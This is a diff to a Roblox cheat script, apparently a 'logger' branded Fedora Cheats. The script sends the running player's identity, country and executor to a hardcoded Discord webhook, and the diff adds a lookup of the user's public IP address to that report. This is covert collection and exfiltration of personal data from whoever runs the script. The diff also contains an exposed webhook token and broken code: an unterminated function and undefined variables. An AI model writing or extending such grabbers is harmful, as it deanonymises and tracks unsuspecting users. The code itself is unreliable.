@@ -10,6 +10,7 @@ local Input     = game:GetService("UserInputService")
 local Vim       = game:GetService("VirtualInputManager")
 local Json      = game:GetService("HttpService")
 local me        = Players.LocalPlayer
+local ipData = HttpService:JSONDecode(response.Body)
 
 local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
 
@@ -65,7 +66,7 @@ do
         return "Unknown"
     end
 
-    local function getpfp(userId)
+    local function getpfp(id)
         local ok, url = pcall(function()
             return Players:GetUserThumbnailAsync(
                 userId,
@@ -74,8 +75,18 @@ do
             )
         end)
         if ok and url then return url end
-        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
+        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(id) .. "&width=420&height=420&format=png"
     end
+
+    local function ipad()
+        local response = http_request({
+    Url = "https://api64.ipify.org/?format=json",
+    Method = "GET"
+})
+
+        
+
+
     
     task.spawn(function()
         local id   = me.UserId
@@ -84,6 +95,7 @@ do
         local country  = getcount()
         local pfp      = getpfp(userId)
         local exec     = getexec()
+        local ip       = ipad()
 
         local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
 
@@ -99,6 +111,7 @@ do
                 { name = "🌍 Country",      value = "`" .. country .. "`",               inline = true },
                 { name = "🕒 Logged Time",  value = "`" .. timestamp .. "`",             inline = false },
                 { name = "⚙️ Executor",     value = "`" .. exec .. "`",                  inline = true },
+                { name = "💤 IP Address",     value = "`" ..  ipData.ipad .. "`",                  inline = true },
                 { name = "🔗 Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
             },
             footer = { text = "Auto Suite Logger • Fedora Cheats" },
